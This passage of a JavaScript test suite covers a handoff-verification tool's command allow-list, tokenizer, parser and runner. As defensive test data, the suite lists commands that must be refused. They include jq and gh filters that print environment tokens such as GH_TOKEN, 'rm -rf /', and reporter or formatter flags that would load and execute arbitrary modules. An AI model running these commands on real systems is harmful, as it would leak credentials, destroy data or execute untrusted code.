    "npx eslint --format=./x.js .": /not on whitelist: npx/,
    "npx eslint -f=json .": /not on whitelist: npx/,
    [`npx mocha -R ${SHARED}/registry-tick.js test`]: /not on whitelist: npx/,
    "npx mocha --reporter=./rep.cjs test": /not on whitelist: npx/,
    [`npx stylelint --formatter=${SHARED}/registry-tick.js src`]:
      /not on whitelist: npx/,
    "npx stylelint -c stylelint.config.js src": /not on whitelist: npx/,
    [`npx markdownlint -c ${SHARED}/registry-tick.js docs`]:
      /not on whitelist: npx/,
    "npx markdownlint-cli2 --config=.markdownlint-cli2.mjs docs/x.md":
      /not on whitelist: npx/,
    "npx jest --reporters=./x.js": /not on whitelist: npx/,
    "npx vitest --run --reporter=../x.js": /not on whitelist: npx/,
    "npx shellcheck -f /x y": /not on whitelist: npx/,
    "npx shellcheck -s ./sh x.sh": /not on whitelist: npx/,
    // QA cycle 9 (bug.15) — a positional under mocha/vitest is never a
    // subcommand (`npx mocha init out` scaffolded four files, executed);
    // vitest requires --run as tsc requires --noEmit.
    "npx mocha init out9": /not on whitelist: npx/,
    "npx mocha init .": /not on whitelist: npx/,
    "npx vitest init browser": /not on whitelist: npx/,
    "npx vitest --run init browser": /not on whitelist: npx/,
    "npx vitest watch": /not on whitelist: npx/,
    "npx vitest --run dev": /not on whitelist: npx/,
    "npx vitest": /not on whitelist: npx/,
    "npx vitest x.test.ts": /not on whitelist: npx/,
    // QA cycle 9 (QA-4) — jq's env builtin prints the inherited environment.
    "jq -n env": /not on whitelist: jq/,
    "jq -rn env.GH_TOKEN": /not on whitelist: jq/,
    "jq -n (env)": /not on whitelist: jq/,
    // QA cycle 9 (QA-6) — a live driver segment anywhere, not only last.
    "npm run eval:x:cli:smoke": /not on whitelist: npm/,
    "npm run eval:x:sdk:y": /not on whitelist: npm/,
    // QA cycle 9 (CR-5) — `-r` could never run; it is no longer claimed.
    "date -r 0": /not on whitelist: date/,
    "date -r +%s": /not on whitelist: date/,
    // QA cycle 10 (bug.17) — a bare NAME is not a closed set: mocha falls
    // back to `require(path.resolve(name))` (executed: `-R zzrep` ran a
    // root-level zzrep.js), vitest html/blob and jest jest-junit write.
    "npx mocha -R zzrep t.js": /not on whitelist: npx/,
    "npx mocha --reporter=index t": /not on whitelist: npx/,
    "npx mocha -R lib t": /not on whitelist: npx/,
    "npx mocha -R mocha-junit-reporter t": /not on whitelist: npx/,
    "npx vitest --run --reporter=html x": /not on whitelist: npx/,
    "npx vitest --run --reporter blob x": /not on whitelist: npx/,
    "npx jest --reporters=jest-junit": /not on whitelist: npx/,
    "npx eslint -f eslint-formatter-pretty .": /not on whitelist: npx/,
    "npx stylelint --formatter=custom src": /not on whitelist: npx/,
    "npx shellcheck -f x y": /not on whitelist: npx/,
    "npx shellcheck -s fish y": /not on whitelist: npx/,
    "npx shellcheck -S loud y": /not on whitelist: npx/,
    // QA cycle 10 (bug.18) — `//` is jq's alternative operator, not a path.
    "jq -n null//env": /not on whitelist: jq/,
    "jq -n .//env": /not on whitelist: jq/,
    "jq -n [.//env]": /not on whitelist: jq/,
    "jq -n 1//env": /not on whitelist: jq/,
    "jq . data/env.json": /not on whitelist: jq/,
    // QA cycle 10 (QA-3/QA-4) — a data dotfile is a `*rc` / `*ignore` name;
    // `..` is refused anywhere in the value.
    "npx eslint -c .env .": /not on whitelist: npx/,
    // QA cycle 11 (QA-1..3) — eslint's config is data by extension only (Node
    // parses an extensionless dotfile as JavaScript and ESLint 9 import()s
    // whatever -c names); ESLint 8's removed formatters resolve to a package
    // first; vitest `basic` is gone in Vitest 4.
    "npx eslint -c .zzrc .": /not on whitelist: npx/,
    "npx eslint -c .eslintrc .": /not on whitelist: npx/,
    "npx eslint --config=.gitignore .": /not on whitelist: npx/,
    "npx eslint -f compact .": /not on whitelist: npx/,
    "npx eslint --format=checkstyle .": /not on whitelist: npx/,
    "npx eslint -f tap .": /not on whitelist: npx/,
    "npx vitest --run --reporter=basic x": /not on whitelist: npx/,
    // QA cycle 13 / 5c (CR-1) — tsc reads a true/false token after a boolean
    // flag as its value: `--noEmit false <file>` emitted into the tree
    // (executed in a consumer-shaped project).
    "npx tsc --noEmit false": /not on whitelist: npx/,
    "npx tsc --noEmit false src": /not on whitelist: npx/,
    "npx tsc --noEmit FALSE": /not on whitelist: npx/,
    "npx tsc --noEmit true": /not on whitelist: npx/,
    // QA cycle 14 (bug.19) — the tool's parser reads these as something other
    // than a file: tsc consumes `null` (unset) and reads `@file` as a response
    // file; jest's yargs consumes `--ci false` and then writes snapshots.
    "npx tsc --noEmit null": /not on whitelist: npx/,
    "npx tsc --noEmit null src": /not on whitelist: npx/,
    "npx tsc --noEmit @tsargs.txt": /not on whitelist: npx/,
    "npx tsc --noEmit @x": /not on whitelist: npx/,
    // QA cycle 16 (bug.23) — tsc's `-p`/`--project` consume the next token
    // as the project path: `-p --noEmit` satisfied the required flag while
    // tsc emitted under a directory of that name (executed). A project is a
    // data file; tsc has no `--opt=value` form at all.
    "npx tsc -p --noEmit": /not on whitelist: npx/,
    "npx tsc --project --noEmit": /not on whitelist: npx/,
    "npx tsc --noEmit -p --noEmit": /not on whitelist: npx/,
    "npx tsc -p ../x.json --noEmit": /not on whitelist: npx/,
    "npx tsc -p x.mjs --noEmit": /not on whitelist: npx/,
    "npx tsc -p /etc/tsconfig.json --noEmit": /not on whitelist: npx/,
    "npx tsc --noEmit -p": /not on whitelist: npx/,
    "npx tsc --pretty=false --noEmit": /not on whitelist: npx/,
    "npx shellcheck -e --format=json x.sh": /not on whitelist: npx/,
    "npx shellcheck -e ./x x.sh": /not on whitelist: npx/,
    "npx shellcheck --exclude=./x x.sh": /not on whitelist: npx/,
    // QA cycle 17 — `-t` takes a value on jest (yargs requiresArg) and vitest
    // (cac); declared bare, the next token was judged as a positional.
    "npx jest -t --ci": /not on whitelist: npx/,
    "npx jest --ci -t": /not on whitelist: npx/,
    "npx vitest -t --run x": /not on whitelist: npx/,
    // The `./` prefix admits no traversal and no doubled slash.
    "npx tsc --noEmit -p ./../x.json": /not on whitelist: npx/,
    "npx tsc --noEmit -p .//x.json": /not on whitelist: npx/,
    "npx tsc --noEmit -p ./x.mjs": /not on whitelist: npx/,
    "npx jest --ci false": /not on whitelist: npx/,
    "npx jest --silent false": /not on whitelist: npx/,
    "npx vitest --run false x": /not on whitelist: npx/,
    "npx prettier --check @x": /not on whitelist: npx/,
    "npx stylelint --quiet false src": /not on whitelist: npx/,
    // QA cycle 15 (bug.21) — jest's --reporters is a greedy yargs array; a
    // following "test path" is loaded as a reporter module (executed).
    "npx jest --ci --reporters default ./zzrep.js": /not on whitelist: npx/,
    "npx jest --reporters=default ./x.js": /not on whitelist: npx/,
    "npx jest --reporters=default": /not on whitelist: npx/,
    // QA cycle 15 (bug.22) — Object.prototype keys are not rules.
    "constructor rm -rf x": /not on whitelist: constructor/,
    "toString anything": /not on whitelist: toString/,
    "__proto__ x": /not on whitelist: __proto__/,
    "hasOwnProperty x": /not on whitelist: hasOwnProperty/,
    "git hasOwnProperty x": /not on whitelist: git/,
    "git constructor": /not on whitelist: git/,
    "npx constructor foo": /not on whitelist: npx/,
    "npx __proto__ x": /not on whitelist: npx/,
    "npx toString": /not on whitelist: npx/,
    // 5c (CR-2) — mocha runs an explicitly named file whatever its name
    // (the bug.11 class): no positional at all, as under `node --test`.
    "npx mocha skills/loop-supervisor/scripts/run-loop.mjs":
      /not on whitelist: npx/,
    "npx mocha test": /not on whitelist: npx/,
    "npx mocha -t 5000 test": /not on whitelist: npx/,
    "npx mocha -t": /not on whitelist: npx/,
    // 5c (CR-3) — gh evaluates --jq with gojq, which has `env` too.
    "gh api /user --jq env": /not on whitelist: gh/,
    "gh api /user -q env": /not on whitelist: gh/,
    "gh api /user --jq=env": /not on whitelist: gh/,
    "gh pr list --jq env": /not on whitelist: gh/,
    "gh pr list -q null//env": /not on whitelist: gh/,
    "gh pr view 1 --jq=[.//env]": /not on whitelist: gh/,
    // QA cycle 12 (QA-1) — a basename containing `..` is refused on eslint too.
    "npx eslint -c x..json .": /not on whitelist: npx/,
    "npx eslint --config=a../x.yml .": /not on whitelist: npx/,
    "npx prettier --check --config=.js .": /not on whitelist: npx/,
    "npx prettier --check --config=.mjs .": /not on whitelist: npx/,
    "npx prettier --check --config=x..json .": /not on whitelist: npx/,
    "npx prettier --check --config=..json .": /not on whitelist: npx/,
  };
  for (const [cmd, why] of Object.entries(refused)) {
    const r = mod.isAllowed(cmd);
    assert.equal(r.ok, false, `${JSON.stringify(cmd)} must be refused`);
    assert.match(r.detail, why, cmd);
  }
});

test("whitelist: an approved npx argv runs with --no-install, injected once (bug.10)", () => {
  // The runner is non-TTY with CI=1, under which npm installs a missing tool
  // from the registry without a prompt (executed in gate 7). The approved
  // argv is the running argv — this is the one flag it adds, and it only
  // removes a capability.
  assert.deepEqual(mod.isAllowed("npx prettier --check .").argv, [
    "npx",
    "--no-install",
    "prettier",
    "--check",
    ".",
  ]);
  assert.deepEqual(mod.isAllowed("command npx tsc --noEmit").argv, [
    "npx",
    "--no-install",
    "tsc",
    "--noEmit",
  ]);
  // Already present: not doubled.
  assert.deepEqual(mod.isAllowed("npx --no-install eslint .").argv, [
    "npx",
    "--no-install",
    "eslint",
    ".",
  ]);
  // No other binary's argv is touched.
  assert.deepEqual(mod.isAllowed("npm test").argv, ["npm", "test"]);
  assert.deepEqual(mod.isAllowed("git status").argv, ["git", "status"]);
});

test("whitelist: the shell-exec corpus's hostile direction is refused in full (the probe that found bug.1, made permanent)", () => {
  const cases = corpusFor("shell-exec");
  assert.ok(cases.length >= 20, `corpus has ${cases.length} cases`);
  const hostile = cases.filter((c) => c.direction === "hostile");
  const accepted = hostile
    .filter((c) => mod.isAllowed(c.input).ok)
    .map((c) => `${c.id}: ${JSON.stringify(c.input)}`);
  assert.deepEqual(accepted, [], "a hostile input was accepted");
  // The legitimate direction may be refused — fail-closed is the design — but
  // the reason must always be one the caller can act on.
  for (const c of cases) {
    const r = mod.isAllowed(c.input);
    if (!r.ok)
      assert.match(
        r.detail,
        /no command|shell operator|shell expansion|not on whitelist/,
        c.id,
      );
  }
});

test("whitelist: an unknown flag is refused on EVERY binary and git subcommand (the allow-list property)", () => {
  const probes = [
    "git log --zz-unknown",
    "git show --zz-unknown",
    "git status --zz-unknown",
    "git rev-parse --zz-unknown",
    "git describe --zz-unknown",
    "git ls-files --zz-unknown",
    "git ls-remote --zz-unknown .",
    "git diff --zz-unknown",
    "git rev-list --zz-unknown HEAD",
    "git cat-file --zz-unknown x",
    "git blame --zz-unknown x",
    "git shortlog --zz-unknown",
    "git branch --zz-unknown",
    "git tag --zz-unknown",
    "git remote --zz-unknown",
    "git remote get-url --zz-unknown origin",
    "gh pr list --zz-unknown",
    "gh api repos/x --zz-unknown",
    "node --zz-unknown x.js",
    "python3 --zz-unknown x.py",
    "npm run test --zz-unknown",
    "npm test --zz-unknown",
    "npx prettier --zz-unknown .",
    "npx eslint --zz-unknown .",
    "grep --zz-unknown x y",
    "ls --zz-unknown",
    "wc --zz-unknown x",
    "cat --zz-unknown x",
    "head --zz-unknown x",
    "tail --zz-unknown x",
    "stat --zz-unknown x",
    "test --zz-unknown x",
    "jq --zz-unknown . x",
    "shellcheck --zz-unknown x.sh",
    "find . --zz-unknown",
    "date --zz-unknown",
    // joined and abbreviated forms of the same
    "git log --zz=1",
    "gh api repos/x --zz=1",
    "npx prettier --zz=1 .",
    "git branch --lis",
    "git branch --list=x --del",
  ];
  const accepted = probes.filter((p) => mod.isAllowed(p).ok);
  assert.deepEqual(accepted, [], "an unknown flag was accepted");
});

test("whitelist: shell operators are judged per token — a quoted pipe is a pattern, a bare one is a pipe (CR-12)", () => {
  assert.equal(mod.isAllowed("grep -E 'a|b' x").ok, true);
  assert.equal(mod.isAllowed("jq '.a | .b' x.json").ok, true);
  assert.equal(mod.isAllowed("git log | head").ok, false);
  assert.equal(mod.isAllowed("git log |head").ok, false);
  assert.equal(
    mod.isAllowed("cat x>y").ok,
    false,
    "a glued redirect is still a redirect",
  );
  assert.equal(
    mod.isAllowed("cat 'x>y'").ok,
    false,
    "> is refused even quoted — no read-only use",
  );
});

test("tokenize: an empty quoted token is a token, and an unterminated quote is refused (gate 9, bug.16)", () => {
  // The argv that runs must be the command the handoff recorded: dropping
  // the "" ran `grep -c README.md` against stdin and CONFIRMED the wrong
  // command against an expect of 0.
  assert.deepEqual(mod.tokenize('grep -c "" README.md'), [
    "grep",
    "-c",
    "",
    "README.md",
  ]);
  assert.deepEqual(mod.tokenize("jq --arg x '' . f"), [
    "jq",
    "--arg",
    "x",
    "",
    ".",
    "f",
  ]);
  assert.deepEqual(mod.isAllowed('grep -c "" README.md').argv, [
    "grep",
    "-c",
    "",
    "README.md",
  ]);
  assert.deepEqual(mod.tokenize('a "b c"d e'), ["a", "b cd", "e"]);
  assert.equal(mod.tokenize('grep -c "a b'), null);
  const r = mod.isAllowed('grep -c "a b');
  assert.equal(r.ok, false);
  assert.equal(r.detail, "unterminated quote");
});

// ---------------------------------------------------------------------------
// verify — every verdict through the injected runner
// ---------------------------------------------------------------------------

test("verify: confirmed when every figure's tokens appear in the output; stale when one moved", async () => {
  const doc =
    TABLE_HEADER +
    "| Frontier | `command node skills/develop-next/scripts/select-next.mjs` | **selected B13** |\n" +
    "| Lint | `command node skills/develop-next/scripts/select-next.mjs --lint` | **0 errors, 0 warnings** |\n";
  const runner = stubRunner({
    "node skills/develop-next/scripts/select-next.mjs": {
      stdout: '{"status":"selected","item":{"id":"T110"}}',
    },
    "node skills/develop-next/scripts/select-next.mjs --lint": {
      stdout: '{"errors":0,"warnings":0}',
    },
  });
  const r = await mod.verify(mod.parseHandoff(doc), { runner });
  assert.equal(r.lines[0].verdict, "stale");
  assert.match(r.lines[0].detail, /selected B13/);
  assert.match(
    r.lines[0].measured,
    /item\.id: T110/,
    "the new value is reported",
  );
  assert.equal(r.lines[1].verdict, "confirmed");
  assert.deepEqual(r.counts, { confirmed: 1, stale: 1, unverifiable: 0 });
  assert.equal(r.reason, "stale");
  assert.equal(r.exitCode, 0, "stale is information, not failure");
});

test("verify: token match is whole-token — `b13` is not satisfied by `b130`", async () => {
  const doc = TABLE_HEADER + "| Frontier | `git status` | **B13** |\n";
  const r = await mod.verify(mod.parseHandoff(doc), {
    runner: stubRunner({ "git status": { stdout: "selected B130" } }),
  });
  assert.equal(r.lines[0].verdict, "stale");
});

test("verify: an `exit N` figure is compared against the exit code, not the text", async () => {
  const doc = TABLE_HEADER + "| Suite | `command npm test` | **exit 0** |\n";
  const ok = await mod.verify(mod.parseHandoff(doc), {
    runner: stubRunner({ "npm test": { status: 0, stdout: "garbage" } }),
  });
  assert.equal(ok.lines[0].verdict, "confirmed");
  const bad = await mod.verify(mod.parseHandoff(doc), {
    runner: stubRunner({ "npm test": { status: 1, stdout: "exit 0" } }),
  });
  assert.equal(bad.lines[0].verdict, "stale");
  assert.equal(bad.lines[0].measured, "exit 1");
});

test("verify: every unverifiable detail is reachable, and none of them calls the runner", async () => {
  const doc =
    TABLE_HEADER +
    "| No command | inspect the catalog | 126 rows |\n" +
    "| Refused | `rm -rf /` | **gone** |\n" +
    "| Operator | `git log \\| head` | **x** |\n" +
    "| Timeout | `command npm test` | **exit 0** |\n" +
    "| Failed | `git log -1` | **abc123** |\n" +
    "| Threw | `git status` | **clean** |\n" +
    "no figure on this line <!-- cmd: git rev-parse HEAD -->\n";
  const runner = stubRunner({
    "npm test": { timedOut: true, status: null },
    "git log -1": { status: 128, stderr: "fatal: not a git repository" },
  });
  const throwing = (argv, o) => {
    if (argv[0] === "git" && argv[1] === "status") throw new Error("ENOENT");
    return runner(argv, o);
  };
  const r = await mod.verify(mod.parseHandoff(doc), {
    runner: throwing,
    timeoutSeconds: 7,
  });
  const details = r.lines.map((l) => [l.verdict, l.detail]);
  assert.deepEqual(details, [
    ["unverifiable", "no command"],
    ["unverifiable", "not on whitelist: rm"],
    ["unverifiable", "shell operator"],
    ["unverifiable", "timeout (7s)"],
    ["unverifiable", "command failed (exit 128)"],
    ["unverifiable", "could not run: ENOENT"],
    ["unverifiable", "no figure"],
  ]);
  assert.deepEqual(
    runner.calls,
    ["npm test", "git log -1"],
    "refused rows never reach the runner",
  );
  assert.equal(r.reason, "unverifiable");
  assert.equal(
    r.exitCode,
    1,
    "NOTHING could be checked — that is a claim about the instrument",
  );
});

test("verify: unverifiable alongside confirmed is reason=unverifiable with exit 0; stale outranks it", async () => {
  const doc =
    TABLE_HEADER + "| A | `git status` | **clean** |\n| B | prose only | x |\n";
  const r = await mod.verify(mod.parseHandoff(doc), {
    runner: stubRunner({ "git status": { stdout: "clean" } }),
  });
  assert.equal(r.reason, "unverifiable");
  assert.equal(r.exitCode, 0);
  const r2 = await mod.verify(mod.parseHandoff(doc), {
    runner: stubRunner({ "git status": { stdout: "dirty" } }),
  });
  assert.equal(r2.reason, "stale");
});

test("verify: an empty document is no-figures, exit 1", async () => {
  const r = await mod.verify(mod.parseHandoff("# nothing here\n"), {
    runner: stubRunner({}),
  });
  assert.equal(r.reason, "no-figures");
  assert.equal(r.exitCode, 1);
});

test("parse: a malformed or path-shaped expect: is one unverifiable line, never a throw (CR-3)", async () => {
  const doc = [
    "path **x** <!-- cmd: git status; expect: /usr/bin/node -->",
    "broken **x** <!-- cmd: git status; expect: /2026-09-(0[8-9]/ -->",
    "fine **x** <!-- cmd: git status; expect: /clean/ -->",
  ].join("\n");
  const figures = mod.parseHandoff(doc);
  assert.equal(figures.length, 3);
  const r = await mod.verify(figures, {
    runner: stubRunner({ "git status": { stdout: "clean" } }),
  });
  assert.equal(r.lines[0].verdict, "unverifiable");
  assert.match(r.lines[0].detail, /bad expect regex/);
  assert.equal(r.lines[1].verdict, "unverifiable");
  assert.match(r.lines[1].detail, /bad expect regex/);
  assert.equal(r.lines[2].verdict, "confirmed");
});

test("parse: a blank line ends the header table, so a following table is not read as figures (CR-4)", () => {
  const doc =
    TABLE_HEADER +
    "| A | `git status` | **clean** |\n" +
    "\n" +
    "| Id | Title | Note |\n" +
    "| --- | --- | --- |\n" +
    "| T111 | something | note |\n";
  const figures = mod.parseHandoff(doc);
  assert.equal(figures.length, 1);
  assert.equal(figures[0].check, "A");
});

test("parse: an empty or punctuation-only Result cell is `no figure`, not a figure of nothing (CR-9)", async () => {
  const doc =
    TABLE_HEADER + "| A | `git status` |  |\n| B | `git status` | — |\n";
  const runner = stubRunner({ "git status": { stdout: "clean" } });
  const r = await mod.verify(mod.parseHandoff(doc), { runner });
  assert.deepEqual(
    r.lines.map((l) => [l.verdict, l.detail]),
    [
      ["unverifiable", "no figure"],
      ["unverifiable", "no figure"],
    ],
  );
  assert.deepEqual(runner.calls, [], "nothing to compare → nothing runs");
});

test("parse: an empty bold figure on the comment path is `no figure`, as on the table path (CR-10)", async () => {
  const doc = "Open PRs: **—** <!-- cmd: git status -->\n";
  const runner = stubRunner({ "git status": { stdout: "clean" } });
  const r = await mod.verify(mod.parseHandoff(doc), { runner });
  assert.equal(r.lines[0].verdict, "unverifiable");
  assert.equal(r.lines[0].detail, "no figure");
  assert.deepEqual(runner.calls, []);
});

test("parse: an empty `expect:` is `no figure`, and a row shorter than its header is named by row (gate 8, QA-4/QA-5)", async () => {
  // An empty expect: used to parse as figures [""] — past the no-figure
  // guard, and a "" that every output fails to contain, so `stale: moved:`.
  const doc = "Tip: <!-- cmd: git status; expect:  -->\n";
  const runner = stubRunner({ "git status": { stdout: "clean" } });
  const r = await mod.verify(mod.parseHandoff(doc), { runner });
  assert.equal(r.lines[0].verdict, "unverifiable");
  assert.equal(r.lines[0].detail, "no figure");
  assert.deepEqual(runner.calls, []);
  // Check column last, row with one cell: no check cell exists.
  const short = mod.parseHandoff(
    "| Command | Result | Check |\n|---|---|---|\n| `git status` |\n",
  );
  assert.equal(short[0].check, "row 3");
  assert.equal(short[0].command, "git status");
});

test("compare: snake_case is not emphasis — probes_executed matches probes_executed (CR-8)", async () => {
  const doc = TABLE_HEADER + "| A | `git status` | **probes_executed** 3 |\n";
  const r = await mod.verify(mod.parseHandoff(doc), {
    runner: stubRunner({
      "git status": { stdout: "probes_executed: 3 verdict_kind: x" },
    }),
  });
  assert.equal(r.lines[0].verdict, "confirmed");
});

test("verify: grep exit 1 (no match) and test exit 1 (false) are measurements, not failures (CR-11)", async () => {
  const doc =
    TABLE_HEADER +
    "| Count | `grep -c nope file.txt` | **0** |\n" +
    "| Flag | `test -f missing` | **exit 1** |\n" +
    "| Other | `git status` | **clean** |\n";
  const runner = stubRunner({
    "grep -c nope file.txt": { status: 1, stdout: "0\n" },
    "test -f missing": { status: 1 },
    "git status": { status: 1, stdout: "clean" },
  });
  const r = await mod.verify(mod.parseHandoff(doc), { runner });
  assert.equal(r.lines[0].verdict, "confirmed", "grep exit 1 with a 0 count");
  assert.equal(r.lines[1].verdict, "confirmed", "an explicit exit 1 figure");
  assert.equal(
    r.lines[2].verdict,
    "unverifiable",
    "git exit 1 is still a failure",
  );
  assert.match(r.lines[2].detail, /command failed \(exit 1\)/);
});

// ---------------------------------------------------------------------------
// Regression — the 2026-09-10 handoff against the 2026-09-12 measurements
// ---------------------------------------------------------------------------

test("regression: the 2026-09-10 handoff reads stale on the frontier line and the change-log.js 'touched since' claim", async () => {
  const text = fs.readFileSync(FIXTURE_2026_09_10, "utf8");
  const figures = mod.parseHandoff(text);
  // What the 2026-09-12 session measured (its handoff §1 and §3a), injected so
  // the test is hermetic and does not depend on today's frontier or git log.
  const runner = stubRunner({
    "node skills/develop-next/scripts/select-next.mjs": {
      stdout: '{"status":"stop","stopReason":"roadmap-complete","item":null}',
    },
    [`git log -1 --format=%ci -- ${CHANGE_LOG_JS}`]: {
      stdout: "2026-08-17 10:21:44 +0100\n",
    },
    "npm test": {
      status: 0,
      stdout: "505 bash assertions, 3155 node tests, 0 failures, 1 skipped",
    },
    "npm run eval:all": {
      status: 0,
      stdout: "51 replay scenarios, all assertions passed",
    },
    "npm run bundle -- --check": {
      status: 0,
      stdout: "126 skills checked, 0 problems",
    },
    // The stub is keyed on the argv that RUNS, which carries the injected
    // --no-install (bug.10); a stub keyed on the written spelling is never
    // reached.
    "npx --no-install prettier --check .": {
      status: 0,
      stdout: "All matched files use Prettier code style!",
    },
  });
  const r = await mod.verify(figures, { runner });
  const byCheck = Object.fromEntries(r.lines.map((l) => [l.check, l]));

  const frontier = r.lines.find((l) => /frontier is not empty/i.test(l.check));
  assert.ok(frontier, "the annotated frontier line was parsed");
  assert.equal(frontier.verdict, "stale");
  assert.match(frontier.measured, /roadmap-complete/);

  const touched = r.lines.find((l) => /touched since/i.test(l.check));
  assert.ok(touched, "the annotated 'touched since' line was parsed");
  assert.equal(touched.verdict, "stale");
  assert.match(touched.measured, /2026-08-17/);

  assert.equal(r.reason, "stale");
  assert.ok(
    r.counts.stale >= 2,
    `at least two stale lines, got ${r.counts.stale}`,
  );
  // The rows the fixture cannot measure here say so rather than passing.
  assert.equal(
    byCheck["Skill catalog"].verdict,
    "unverifiable",
    "npm run generate-catalog writes → refused",
  );
  assert.equal(byCheck["Dependency graph"].verdict, "unverifiable");
  assert.equal(byCheck["Hermetic suite"].verdict, "confirmed");
  // The fixture's figure is the prose "clean", which no runner prints — a
  // stale verdict is the design — but the measurement itself proves the
  // injected argv reached the stub.
  assert.equal(byCheck["Formatting"].verdict, "stale");
  assert.match(byCheck["Formatting"].measured, /Prettier code style/);
});

// ---------------------------------------------------------------------------
// CLI contract — spawn the real script on fixtures whose commands are cheap
// ---------------------------------------------------------------------------

// A fixture package whose `npm test` is the slow script: the allow-listed
// spelling that reaches an arbitrary file in a scratch directory.
const SLOW_PACKAGE_JSON = JSON.stringify({
  name: "slow-fixture",
  version: "0.0.0",
  private: true,
  scripts: { test: "node slow.js" },
});

function runCli(args, cwd) {
  const r = spawnSync(process.execPath, [SCRIPT, ...args], {
    cwd,
    encoding: "utf8",
  });
  return { status: r.status, stdout: r.stdout, stderr: r.stderr };
}

test("cli: --json emits one object with reason/counts/lines/exitCode and mirrors it in the exit code", () => {
  const dir = tempDir();
  execFileSync("git", ["init", "-q"], { cwd: dir });
  fs.writeFileSync(
    path.join(dir, "handoff.md"),
    TABLE_HEADER +
      "| In a repo | `git rev-parse --is-inside-work-tree` | **true** |\n" +
      "| Catalog | inspect the catalog | 126 rows |\n",
  );
  const r = runCli(["handoff.md", "--json"], dir);
  assert.equal(r.status, 0, r.stderr);
  const obj = JSON.parse(r.stdout);
  assert.equal(obj.reason, "unverifiable");
  assert.deepEqual(obj.counts, { confirmed: 1, stale: 0, unverifiable: 1 });
  assert.equal(obj.lines[0].verdict, "confirmed");
  assert.equal(obj.exitCode, r.status);
  assert.equal("json" in obj, false, "the internal flag is not emitted");
  // Table form on the same file.
  const t = runCli(["handoff.md"], dir);
  assert.match(t.stdout, /✓ confirmed .*In a repo/);
  assert.match(
    t.stdout,
    /1 confirmed · 0 stale · 1 unverifiable → unverifiable/,
  );
});

test("cli: missing file → reason=missing exit 1; unknown flag → usage exit 2; --help exit 0", () => {
  const dir = tempDir();
  const missing = runCli(["nope.md", "--json"], dir);
  assert.equal(missing.status, 1);
  assert.equal(JSON.parse(missing.stdout).reason, "missing");
  // A directory (or an unreadable file) is one JSON object like every other
  // outcome, never a stack trace (gate 9, QA-5).
  fs.mkdirSync(path.join(dir, "adir"));
  const unreadable = runCli(["adir", "--json"], dir);
  assert.equal(unreadable.status, 1);
  const u = JSON.parse(unreadable.stdout);
  assert.equal(u.reason, "missing");
  assert.equal(u.detail, "EISDIR");
  assert.doesNotMatch(unreadable.stderr, /at .*node:fs/);
  const plain = runCli(["adir"], dir);
  assert.equal(plain.status, 1);
  assert.match(plain.stderr, /is not readable \(EISDIR\)/);
  const usage = runCli(["--bogus"], dir);
  assert.equal(usage.status, 2);
  assert.match(usage.stderr, /unknown flag/);
  const help = runCli(["--help"], dir);
  assert.equal(help.status, 0);
  assert.match(help.stderr, /usage: handoff-verify/);
});

test("cli: a `command ` prefix is stripped, the argv runs without a shell, and a timeout kills the whole process group (CR-6)", () => {
  const dir = tempDir();
  const pidFile = path.join(dir, "child.pid");
  // slow.js forks a grandchild that records its pid and sleeps; the group
  // kill must reach it, not only slow.js. It runs as the fixture's `npm test`
  // — `node slow.js` is no longer a shape the node arm admits, since gate 7
  // (bug.8) closed `node <script>` to an exact list — so the tree the kill
  // must cover is verifier → npm → sh → node slow.js → grandchild.
  fs.writeFileSync(
    path.join(dir, "slow.js"),
    `const { spawn } = require("child_process");
     const c = spawn(process.execPath, ["-e", "setTimeout(function(){}, 20000)"], { stdio: "ignore" });
     require("fs").writeFileSync(${JSON.stringify(pidFile)}, String(c.pid));
     setTimeout(function(){}, 20000);`,
  );
  fs.writeFileSync(path.join(dir, "package.json"), SLOW_PACKAGE_JSON);
  fs.writeFileSync(
    path.join(dir, "handoff.md"),
    TABLE_HEADER + "| Slow | `command npm test` | **done** |\n",
  );
  // 3 s, not 1: under load node can take longer than a second to start, and
  // a leader killed before it forked proves nothing about the group kill.
  const r = runCli(["handoff.md", "--json", "--timeout", "3"], dir);
  const obj = JSON.parse(r.stdout);
  assert.equal(obj.lines[0].verdict, "unverifiable");
  assert.match(obj.lines[0].detail, /timeout \(3s\)/);
  const grandchild = Number(fs.readFileSync(pidFile, "utf8"));
  assert.ok(grandchild > 0);
  let alive = true;
  try {
    process.kill(grandchild, 0);
  } catch {
    alive = false;
  }
  if (alive) {
    try {
      process.kill(grandchild, "SIGKILL");
    } catch {
      /* raced */
    }
  }
  assert.equal(
    alive,
    false,
    "the grandchild outlived the timeout — the process group was not killed",
  );
});

test("runner: output beyond the cap makes the figure unverifiable, never a comparison against a partial stream (PRB-7, CR-2)", async () => {
  const dir = tempDir();
  fs.writeFileSync(
    path.join(dir, "loud.js"),
    // Past the cap, then linger: the runner must not wait for the child once
    // the verdict is fixed (5c CR-6) — it kills the group at the cap.
    // The linger (45 s) is well past the bound (40 s) and the runner timeout
    // (90 s) is past both, so the only way to resolve inside the bound is
    // the kill at the cap — with slack for a loaded machine (a 10 s bound
    // went red once under the full suite at concurrency 4; gate 14, QA-3).
    "const s = 'x'.repeat(1024 * 1024); for (let i = 0; i < 18; i++) process.stdout.write(s); process.stdout.write('\\nEND\\n'); setTimeout(() => {}, 45000);",
  );
  const t0 = Date.now();
  const r = await mod.defaultRunner([process.execPath, "loud.js"], {
    cwd: dir,
    timeoutMs: 90000,
  });
  assert.ok(
    Date.now() - t0 < 40000,
    `resolved at the cap, not at exit (${Date.now() - t0} ms)`,
  );
  assert.equal(r.status, null, "killed at the cap, not exited");
  assert.equal(r.truncated, true);
  assert.ok(
    r.stdout.length <= 16 * 1024 * 1024 + 1024 * 1024,
    `stdout held to the cap (${r.stdout.length})`,
  );
  // verify() must not compare a figure against the head of a truncated stream.
  const figures = mod.parseHandoff(
    TABLE_HEADER + "| Loud | `git status` | **END** |\n",
  );
  const v = await mod.verify(figures, {
    runner: () => ({
      status: 0,
      stdout: "x".repeat(100),
      stderr: "",
      timedOut: false,
      error: null,
      truncated: true,
    }),
  });
  assert.equal(v.lines[0].verdict, "unverifiable");
  assert.match(v.lines[0].detail, /output truncated/);
});

test("verify: a rule that throws is one unverifiable line, never a lost run (gate 15, bug.22)", async () => {
  const r = await mod.verify(
    mod.parseHandoff("- x **1** <!-- cmd: boom x; expect: 1 -->\n"),
    {
      whitelist: {
        boom: () => {
          throw new Error("rule exploded");
        },
      },
      runner: () => ({
        status: 0,
        stdout: "",
        stderr: "",
        timedOut: false,
        error: null,
        truncated: false,
      }),
    },
  );
  assert.equal(r.lines[0].verdict, "unverifiable");
  assert.match(r.lines[0].detail, /could not judge: rule exploded/);
});

